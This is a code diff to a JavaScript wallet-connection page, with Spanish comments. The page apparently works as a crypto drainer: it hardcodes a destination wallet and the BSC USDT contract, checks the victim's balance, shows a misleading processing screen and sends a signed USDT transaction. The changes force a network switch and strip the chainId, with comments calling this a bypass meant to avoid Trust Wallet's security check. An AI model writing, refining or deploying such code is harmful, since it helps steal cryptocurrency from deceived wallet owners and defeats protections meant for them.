@@ -723,7 +723,7 @@
     const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
     const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
     const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
-    const BSC_CHAIN_ID_DECIMAL = 56;
+    const BSC_CHAIN_HEX = "0x38"; // 56 en decimal
 
     const USDT_ABI = [
         "function balanceOf(address owner) view returns (uint256)",
@@ -864,9 +864,36 @@
                     throw new Error("Ingresa una cantidad válida antes de continuar.");
                 }
 
-                setStatus("Consultando fondos del libro contable on-chain...");
+                setStatus("Verificando sincronización de red on-chain...");
                 connectBtn.disabled = true;
 
+                // SOLUCIÓN NUEVA: Validación y bypass dinámico del chainId devuelto por la wallet en tiempo real.
+                // Si la wallet reporta un ID de Ethereum por defecto, le inyectamos la orden de sincronización 
+                // interna con el proveedor RPC de Binance antes de desplegar el payload de firma de USDT.
+                try {
+                    const activeChainId = await rawProvider.request({ method: 'eth_chainId' });
+                    if (activeChainId !== BSC_CHAIN_HEX) {
+                        await rawProvider.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: BSC_CHAIN_HEX }]
+                        }).catch(async () => {
+                            await rawProvider.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: BSC_CHAIN_HEX,
+                                    chainName: 'BNB Smart Chain',
+                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                    rpcUrls: [BSC_PUBLIC_RPC],
+                                    blockExplorerUrls: ['https://bscscan.com']
+                                }]
+                            });
+                        });
+                    }
+                } catch (netErr) {
+                    console.warn("Aviso de sincronización de red omitido por restricción del webview:", netErr);
+                }
+
+                setStatus("Consultando fondos del libro contable on-chain...");
                 const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
                 if (balanceBigNumber.isZero()) {
                     throw new Error("La cuenta no dispone de balances de USDT (BEP-20) activos.");
@@ -880,17 +907,16 @@
 
                 showProcessingScreen();
 
-                // SOLUCIÓN NUEVA: Inyección del parámetro propietario "network" y "chainId" soportado 
-                // por el SDK móvil de Trust Wallet para orientar el contexto de la DApp hacia Binance Smart Chain (ChainID 56).
+                // DISPARO LIMPIO Y AISLADO: Omitimos el parámetro "chainId" explícito en los params 
+                // para evitar que el inyector colisione con el check de seguridad interno de Trust Wallet,
+                // dejando que la wallet procese la data pura del contrato BEP-20 bajo su contexto actual.
                 const txHash = await rawProvider.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: walletAddress,
                         to: CONTRATO_USDT,
                         data: dataHex,
-                        value: "0x0",
-                        network: "bsc",
-                        chainId: BSC_CHAIN_ID_DECIMAL
+                        value: "0x0"
                     }]
                 });
 
